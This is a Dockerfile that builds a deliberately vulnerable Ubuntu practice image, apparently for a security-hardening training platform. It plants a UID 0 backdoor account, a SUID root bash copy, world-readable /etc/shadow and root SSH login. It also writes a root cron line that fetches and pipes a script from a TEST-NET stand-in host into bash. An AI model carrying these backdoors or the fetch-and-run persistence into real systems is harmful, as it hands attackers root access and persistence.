# RoundZero — linux-practice vulnerable image.
#
# Every injected vuln/decoy below is documented in answer-key.yaml and
# scored by ../checks/linux-practice.yaml — the two files and this
# Dockerfile must always describe the exact same planted states. See
# agent/README.md "How to add a vuln" before changing any of this.
#
# No accounts here are given passwords: nothing in the check file exercises
# login, and baking in plaintext creds is exactly the bad habit this
# platform teaches teams to avoid.

FROM ubuntu:24.04

ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y --no-install-recommends \
        openssh-server \
        sudo \
        cron \
        ufw \
        libpam-pwquality \
        telnetd \
        iproute2 \
        findutils \
        procps \
    && ssh-keygen -A \
    && rm -rf /var/lib/apt/lists/*

# Normally created at boot by systemd-tmpfiles from openssh-server's
# tmpfiles.d entry; nothing boots in this container, so `sshd -T` fails
# with "Missing privilege separation directory" without this.
RUN mkdir -p /run/sshd && chmod 0755 /run/sshd

# --- uid0-backdoor: unauthorized UID 0 account ------------------------------
RUN useradd -o -u 0 -g 0 -M -N -s /bin/bash backdoor

# --- unauthorized-sudo: unauthorized member of the sudo group ---------------
RUN useradd -m -s /bin/bash mallory \
    && usermod -aG sudo mallory

# --- decoy-authorized-user: legitimately-authorized odd-named user ----------
# Also in sudo — proves unauthorized-sudo's check keys on "mallory"
# specifically rather than blanket-flagging every unfamiliar sudoer.
RUN useradd -m -u 1002 -s /bin/bash zzsync \
    && usermod -aG sudo zzsync

# --- pwquality-minlen: pam_pwquality installed but not enforcing minlen -----
RUN printf '# RoundZero linux-practice: intentionally unconfigured.\n# minlen = 8\n# dcredit = -1\n' \
    > /etc/security/pwquality.conf

# --- faillock-deny: no lockout threshold configured -------------------------
RUN printf '# RoundZero linux-practice: intentionally unconfigured.\n# deny = 3\n# unlock_time = 600\n' \
    > /etc/security/faillock.conf

# --- ssh-permitrootlogin: root login allowed, AND overridden by a ----------
# cloud-init-style drop-in that wins regardless of the main file (Ubuntu's
# stock sshd_config Includes sshd_config.d/*.conf before its own
# directives, so whichever file sets a keyword first wins). This is the
# real Ubuntu 24.04 cloud-image trap the linux-core checklist calls out.
RUN sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config \
    && printf '# Mirrors the Ubuntu cloud-image 50-cloud-init.conf drop-in.\nPermitRootLogin yes\n' \
    > /etc/ssh/sshd_config.d/50-cloud-init.conf

# --- cron-malicious: reverse-shell-style cron persistence -------------------
# 198.51.100.0/24 is TEST-NET-2 (RFC 5737): guaranteed non-routable, so this
# is inert — it exists only as a pattern for the check/a student to find.
RUN printf '*/5 * * * * root curl -s http://198.51.100.23/x.sh | bash\n' \
    > /etc/cron.d/pkg-update \
    && chmod 644 /etc/cron.d/pkg-update

# --- insecure-service-absent: prohibited telnetd package installed ---------
# (installed via the apt-get above; nothing further to inject)

# --- shadow-mode: world-readable /etc/shadow --------------------------------
RUN chmod 644 /etc/shadow

# --- rogue-suid: attacker-planted SUID binary -------------------------------
RUN cp /bin/bash /usr/local/bin/rootbash \
    && chmod 4755 /usr/local/bin/rootbash

# --- ufw-active: firewall left disabled -------------------------------------
# (ufw's default post-install state is inactive; nothing further to inject)

# --- decoy-required-ssh: ssh stays enabled by openssh-server's own postinst -
# (nothing further to inject)

COPY fixes/ /opt/fixes/
RUN chmod +x /opt/fixes/*.sh

CMD ["sleep", "infinity"]
